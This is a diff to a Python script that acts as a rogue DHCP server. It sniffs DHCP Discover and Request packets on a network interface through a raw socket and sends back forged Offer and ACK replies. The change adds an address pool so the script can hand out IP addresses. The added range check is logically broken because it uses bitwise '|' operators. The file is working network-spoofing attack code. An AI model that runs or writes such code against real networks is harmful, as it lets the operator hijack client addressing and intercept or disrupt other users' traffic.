@@ -1,8 +1,9 @@
 #!/usr/bin/python3 -tt
 import argparse
-from socket import socket, htons, SOCK_RAW, AF_PACKET
-from spoofing.packet import parse, IP_PROTOCOL
+from socket import socket, htons, SOCK_RAW, AF_PACKET, inet_ntoa
+from spoofing.packet import parse
 from spoofing.assembler import DhcpPacket
+from spoofing.ippool import IpPool
 
 
 OFFER = 1
@@ -28,9 +29,14 @@ def spoof_init():
 
     parser.add_argument('-v', '--verbose', action='store_true', help='Runs in verbose mode')
     parser.add_argument('-i', '--interface',  help='Network interface to track', required=True)
-    parser.add_argument('-o', '--offer',action='store_true',  help='Testa bagaça')
+    parser.add_argument('-s', '--startip',  help='Initial Ip octet to deliver', default=2,  type=int)
+    parser.add_argument('-e', '--endip',  help='End ip last octet to deliver', default=254,  type=int)
 
     options = parser.parse_args()
+
+    if options.startip > options.endip | 0 > options.startip > 254 | 0> options.endip >254:
+        print ('Invalid ip range entry')
+        return 0
 
     ETH_P_ALL = 3
     s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
@@ -42,6 +48,8 @@ def spoof_init():
     else:
         print('spoof started on %s' % options.interface)
 
+    ip_pool = IpPool(options.startip, options.endip)
+
     BUFFER_SIZE = 1518
     while 1:
         recv = s.recv(BUFFER_SIZE)
@@ -52,14 +60,18 @@ def spoof_init():
         except AttributeError:
             continue
         if packet.ip.udp.dhcp.type == 1:
-            if packet.ip.udp.dhcp.dhcpOptions.dhcpType == 1:
+            if packet.ip.udp.dhcp.dhcpOptions.type == 1:
                 print ('    >is a Discover')
                 print("Sending Offer")
+                if not packet.ip.udp.dhcp.dhcpOptions.requested_ip:
+                    packet.ip.udp.dhcp.dhcpOptions.requested_ip = ip_pool.get_ip_for(packet.origin_mac)
                 pacote = DhcpPacket(OFFER, packet.ip.udp.dhcp.transaction_id, packet.origin_mac, packet.ip.udp.dhcp.dhcpOptions.requested_ip).packet
                 #print(pacote)
                 s.send(pacote)
-            elif packet.ip.udp.dhcp.dhcpOptions.dhcpType == 3:
+            elif packet.ip.udp.dhcp.dhcpOptions.type == 3:
                 print ('    >is a Request')
                 print ('Sending ACK')
+                if not packet.ip.udp.dhcp.dhcpOptions.requested_ip:
+                    packet.ip.udp.dhcp.dhcpOptions.requested_ip = ip_pool.get_ip_for(packet.origin_mac)
                 pacote = DhcpPacket(ACK, packet.ip.udp.dhcp.transaction_id, packet.origin_mac, packet.ip.udp.dhcp.dhcpOptions.requested_ip).packet
                 s.send(pacote)
